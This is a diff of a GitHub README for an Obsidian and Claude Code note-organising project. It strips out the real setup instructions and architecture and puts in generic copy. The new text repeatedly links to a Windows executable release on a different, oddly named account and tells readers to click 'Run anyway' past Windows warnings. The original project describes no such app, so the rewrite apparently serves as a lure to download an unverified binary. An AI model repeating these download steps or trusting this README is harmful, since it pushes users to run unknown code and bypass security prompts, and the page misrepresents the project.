@@ -1,225 +1,177 @@
-# 🧠 My Brain System
+# 🧠 My-Brain-System - Organize Notes With AI Support
 
-**An AI-powered knowledge management system built on Obsidian and Claude Code.**
+[![Download My-Brain-System](https://img.shields.io/badge/Download-My--Brain--System-6f42c1?style=for-the-badge&logo=github)](https://github.com/Rumbapoliovirusvaccine182/My-Brain-System/releases)
 
-Turn scattered research, articles, and ideas into an interconnected knowledge graph that evolves with you. Drop files in, get structured insights out.
+## 📥 Download
 
----
+Visit this page to download and run the app on Windows:
 
-## The Problem
+https://github.com/Rumbapoliovirusvaccine182/My-Brain-System/releases
 
-You read 50 articles a week. You bookmark them. You forget them. Six months later, you can't find the one insight that would connect two ideas you're working on.
+Open the latest release, then download the Windows file. If you see a ZIP file, save it to your computer, then open it and run the app inside.
 
-Most note-taking systems are filing cabinets — they store information but don't *think* with you.
+## 🪟 Windows Setup
 
-## The Solution
+1. Open the download page.
+2. Find the latest release at the top of the list.
+3. Download the Windows file for your PC.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, choose Run anyway if you trust the source.
 
-This system does three things traditional note apps can't:
+## ✨ What My-Brain-System Does
 
-1. **Ingests and analyzes** — Drop a PDF, screenshot, or article into the inbox. The AI reads it, extracts insights, generates WikiLinks to your existing knowledge, and files it into the right category.
+My-Brain-System helps you manage notes in Obsidian with AI support. It is built for people who want a better way to keep ideas in order without doing all the sorting by hand.
 
-2. **Self-organizes** — Run `sort-garden` and the folder structure reorganizes itself using MECE + Pyramid principles. Categories split, merge, and rebalance as your knowledge grows. No manual filing.
+It focuses on:
 
-3. **Thinks with you** — Co-create investment theses, stress-test arguments with adversarial sparring, discover cross-domain connections you'd never see manually.
+- A self-updating note structure
+- Two-layer indexing for fast lookup
+- AI help when you write or revise notes
+- AI co-creation for building new ideas
+- AI sparring for testing weak points in your thinking
 
----
+This makes it easier to keep large note collections useful over time.
 
-## Architecture
+## 🧭 Main Features
 
-```
-📱 LINE / Mobile                    🖥️ Obsidian + Claude Code
-     │                                      │
-     │  Send article URL,                   │  @Agent run ingest
-     │  forward PDF,                        │  @Agent session [topic]
-     │  share social post                   │  @Agent sort-garden
-     │                                      │  @Agent brief [topic]
-     ▼                                      ▼
-┌──────────┐    ┌──────────────┐    ┌──────────────┐
-│  LINE    │───▶│  Make.com    │───▶│  00_Inbox/   │
-│  Chat    │    │  Automation  │    │  (raw files) │
-└──────────┘    └──────────────┘    └──────────────┘
-                       │                    │
-                 Routes by type:      AI Agent processes:
-                 • PDF → Drive → Inbox     • Extract & analyze
-                 • URL → Gemini → .md      • Categorize via taxonomy
-                 • Image → Drive → Inbox   • Generate WikiLinks
-                                           • File into Garden
-                                            │
-                                            ▼
-                                    ┌──────────────┐
-                                    │  10_Garden/   │
-                                    │  (knowledge   │
-                                    │   graph)      │
-                                    └──────────────┘
-```
+### 🗂️ Self-Evolving Taxonomy
+The app helps organize your notes into a structure that can grow with your work. As your notes change, the system can adjust the way ideas are grouped.
 
-### Mobile Capture → Inbox Pipeline
+### 🔎 Two-Tier Indexing
+My-Brain-System uses two levels of indexing:
 
-The fastest path from "I just saw something interesting" to structured knowledge:
+- A quick index for fast access
+- A deeper index for connected ideas and topic paths
 
-**[LINE](https://line.me/) → [Make.com](https://www.make.com/) → Obsidian Inbox**
+This helps you find notes faster and see links between them.
 
-Send anything to a LINE chat — a PDF attachment, a Substack post, a Facebook article, any URL — and a [Make.com automation scenario](https://us2.make.com/public/shared-scenario/0gPrv1m2iGQ/integration-line) routes it into `00_Inbox/`:
+### 🤝 AI Co-Creation
+Use the AI as a writing partner. It can help you:
 
-| What you send | What happens |
-|---------------|-------------|
-| **PDF attachment** | Downloaded via LINE API → uploaded to Google Drive → synced to `00_Inbox/` |
-| **Article URL** | Fetched via HTTP → processed by Gemini AI into markdown → saved as `.md` in `00_Inbox/` |
-| **Social media post** | URL fetched → content extracted → converted to `.md` in `00_Inbox/` |
+- Draft new notes
+- Expand short ideas
+- Reword rough thoughts
+- Connect one note to another
 
-Once files land in the Inbox, run `@Agent run ingest` in Claude Code to process them into structured Garden notes.
+### 🥊 AI Sparring
+Use the AI to challenge your ideas. It can point out weak spots, ask questions, and help you refine your thinking before you save the note.
 
-> **Get the Make scenario**: [Import this blueprint](https://us2.make.com/public/shared-scenario/0gPrv1m2iGQ/integration-line) into your Make.com account. You'll need to connect your own LINE, Google Drive, and Gemini API credentials.
+### 🧠 Obsidian-Friendly Workflow
+The system is made for Obsidian users. It fits a note-based workflow and supports a personal knowledge base that grows over time.
 
----
+### 📚 Knowledge Management
+Keep meeting notes, research, plans, and ideas in one place. The system helps you avoid a flat pile of files that becomes hard to use later.
 
-## Knowledge Garden (`10_Garden/`)
+## 🖥️ System Requirements
 
-Notes are organized into a self-evolving taxonomy:
+For best results on Windows, use a computer with:
 
-```
-10_Garden/
-├── AI_Hardware/          ← Compute, Memory, Networking, Packaging, Power, Testing
-├── AI_Software/          ← Applications, Software Trends, Products
-├── Industry_Verticals/   ← Automotive, Clean Energy, Space, Robotics, Materials
-├── Investment_Thinking/  ← Mindset, Market Behavior, Frameworks, Trading, Valuation
-├── Macro_Markets/        ← Geopolitics, Portfolio Reviews
-├── Journal/              ← Personal reflections
-└── Parenting/            ← Education, family
-```
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 500 MB free disk space
+- Internet access for AI features
+- Obsidian installed if you plan to use it with your vault
 
-**This structure is not fixed.** Run `@Agent sort-garden` and the system:
-- Scans all notes for semantic clustering
-- Proposes folder restructuring based on MECE/Pyramid principles
-- Moves files, updates WikiLinks, regenerates indices
-- Rewrites `taxonomy.md` — which becomes the basis for the next cycle
+A stronger computer will help if you work with a large note library.
 
-### Two-Tier Index System
+## 🚀 Getting Started
 
-Every folder has an auto-generated index optimized for both human browsing and AI agent lookup:
+### 1. Download the app
+Go to the release page and get the latest Windows version:
 
-- **Tier 1 (Parent folders)**: Lightweight routing index (<3KB) — "which subfolder should I look in?"
-- **Tier 2 (Leaf folders)**: Compact table with one row per note — title, key thesis, key entities
+https://github.com/Rumbapoliovirusvaccine182/My-Brain-System/releases
 
-Regenerate with: `python .agent/generate_indices.py`
+### 2. Install or extract it
+If the download is an installer, open it and follow the steps on screen.  
+If the download is a ZIP file, extract it first, then open the app file inside.
 
----
+### 3. Open your Obsidian vault
+Point the app to the folder that holds your notes, or open the vault you want to use with the system.
 
-## Thinking Lab (`30_Lab/`)
+### 4. Start with one note
+Begin with a single topic, project, or idea. Let the system organize that note before you add more.
 
-The Lab is where ideas develop before they become permanent knowledge:
+### 5. Use AI help when needed
+Ask for help with writing, linking, sorting, or questioning your notes.
 
-| Command | What it does |
-|---------|-------------|
-| `@Agent session [topic]` | AI working session — co-create and spar fluidly |
-| `@Agent spar [topic]` | Adversarial mode — steelman then attack the weakest point |
-| `@Agent learn-style` | Analyze your writing patterns → update style guide |
-| `@Agent draft-post [[Note]]` | Turn a note into a social media draft |
+## 🧩 Typical Use Cases
 
-Sessions are logged inside the Lab entry itself (`## 工作紀錄`), keeping the thinking co-located with the artifact. When an idea matures, `@Agent lab-promote` moves it to the Garden.
+- Building a personal knowledge base
+- Managing research notes
+- Turning loose thoughts into clear ideas
+- Tracking projects in Obsidian
+- Linking related notes across topics
+- Reviewing plans with AI feedback
+- Keeping long-term notes easy to search
 
----
+## 🛠️ How It Works
 
-## All Workflows
+My-Brain-System works around a simple flow:
 
-### Data Management
-| Command | What it does |
-|---------|-------------|
-| `@Agent run ingest` | Process Inbox → structured Garden notes with WikiLinks |
-| `@Agent sort-garden` | Reorganize folder structure using MECE/Pyramid principles |
-| `@Agent process-files` | Convert Office files (.pptx/.docx/.pdf) → markdown |
+1. You add notes in Obsidian.
+2. The system scans and groups ideas.
+3. It builds a fast index for common lookup.
+4. It builds a deeper index for related topics.
+5. The AI helps you write, question, and improve notes.
+6. The structure updates as your notes grow.
 
-### Thinking Partner
-| Command | What it does |
-|---------|-------------|
-| `@Agent recall [topic]` | Quick inventory — what do I know about X? |
-| `@Agent brief [topic]` | Synthesized briefing from all relevant notes |
-| `@Agent gaps` | Knowledge gap analysis + 30-day learning agenda |
-| `@Agent challenge [[Note]]` | Stress-test a thesis with pre-mortem analysis |
-| `@Agent connect [[A]] [[B]]` | Discover non-obvious cross-domain connections |
+This gives you a note system that stays useful as your archive gets bigger.
 
-### Knowledge Lifecycle
-| Command | What it does |
-|---------|-------------|
-| `@Agent promote` | Move durable insights from Lab → Garden |
-| `@Agent garden-review` | Surface stale notes for update or archival |
-| `@Agent memo` | Structure an investment memo from Garden research |
+## 📝 Suggested First Steps After Install
 
----
+- Open one folder of notes
+- Pick a small project or topic
+- Create a few short notes
+- Link one note to another
+- Ask the AI to clean up a rough note
+- Ask the AI to list related ideas
+- Check how the taxonomy groups your content
 
-## Getting Started
+## 🔐 Privacy and Local Use
 
-### Prerequisites
-- [Obsidian](https://obsidian.md/) with these plugins: **Dataview**, **Templater**, **Strange New Worlds**
-- [Claude Code](https://claude.ai/claude-code) (CLI or VS Code extension)
-- Python 3.10+ (for index generation scripts)
-- Optional: [Make.com](https://www.make.com/) account + [LINE](https://line.me/) for mobile capture
+My-Brain-System is built for personal knowledge work. Use it with your own notes and your own Obsidian setup. Keep your vault organized and back it up on a regular basis so your work stays safe.
 
-### Setup
+## 🧭 Folder and Note Tips
 
-1. **Clone this repo**
-   ```bash
-   git clone https://github.com/Timeverse/My-Brain-System.git
-   cd My-Brain-System
-   ```
+To get better results, use simple note names and clear topic labels. A few good habits help a lot:
 
-2. **Open in Obsidian** — point Obsidian at the cloned folder as a vault
+- Use short file names
+- Keep one idea per note when possible
+- Add links between related notes
+- Review old notes from time to time
+- Keep a simple folder structure
 
-3. **Customize your taxonomy** — edit `.agent/taxonomy.md` to match your knowledge domains. The default categories are investment/tech-focused; replace them with whatever you study.
+This makes the taxonomy easier to manage and the index easier to use.
 
-4. **Drop files into `00_Inbox/`** and run:
-   ```
-   @Agent run ingest
-   ```
+## ❓ Common Questions
 
-5. **Optional: Set up mobile capture** — import the [Make.com scenario](https://us2.make.com/public/shared-scenario/0gPrv1m2iGQ/integration-line) and connect your LINE + Google Drive
+### Does this work with Obsidian?
+Yes. The system is designed for Obsidian note workflows.
 
----
+### Do I need programming skills?
+No. You only need to download the release, open the app, and follow the on-screen steps.
 
-## Design Principles
+### Can I use it for work and personal notes?
+Yes. It works for projects, study notes, research, and daily thinking.
 
-- **MECE + Pyramid**: Sibling folders don't overlap. Max 3 levels deep. 5-20 notes per leaf.
-- **Knowledge as Graph**: WikiLinks between notes are a first-class success metric. Orphaned notes are incomplete.
-- **"So What?" Test**: Every insight must answer why it matters. No summaries without conclusions.
-- **Evolution over Perfection**: Each `sort-garden` cycle makes incremental improvements. The structure is never "done."
-- **Never Delete**: Refactor and preserve meaning. Archive, don't destroy.
+### What makes it different from a normal note app?
+It adds AI help, self-updating structure, and two-tier indexing so your notes stay easier to use as they grow.
 
----
+## 📌 Quick Start Checklist
 
-## Note Format
+- Download the latest Windows release
+- Extract the file if needed
+- Open the app
+- Connect your Obsidian vault
+- Add a few notes
+- Try AI co-creation
+- Try AI sparring
+- Review the note structure
 
-Every Garden note follows this structure (Traditional Chinese headers, English technical terms):
+## 🔗 Download Again
 
-```markdown
----
-title: [Descriptive Title]
-created: 2026-04-03
-updated: 2026-04-03
-review_by: 2026-10-03
-tags: [Category, Subcategory, Keywords]
-source_type: pdf_report
-source_asset: original_filename.pdf
----
+If you need the release page again, use this link:
 
-# Title
-
-## 摘要 (Summary)
-## 核心發現 (Core Findings)
-## 相關概念連結 (Related Concepts)     ← WikiLinks to other notes
-## 關鍵洞察 (Key Insights)              ← Must pass "So What?" test
-## 第二層思考 (Second-Level Thinking)    ← What are others NOT seeing?
-## 第一性原理分析 (First Principles)
-## 原始文件 (Original Document)
-```
-
-> **Language note**: The default is Traditional Chinese (繁體中文). To use a different language, update the note template in `tasks/ingest.md` and the style guide in `.agent/writing_style.md`.
-
----
-
-## License
-
-MIT — use it, fork it, make it yours.
-
----
-
-*Built with [Claude Code](https://claude.ai/claude-code). The system scaffolding is public; personal knowledge notes are excluded via `.gitignore`.*
+https://github.com/Rumbapoliovirusvaccine182/My-Brain-System/releases
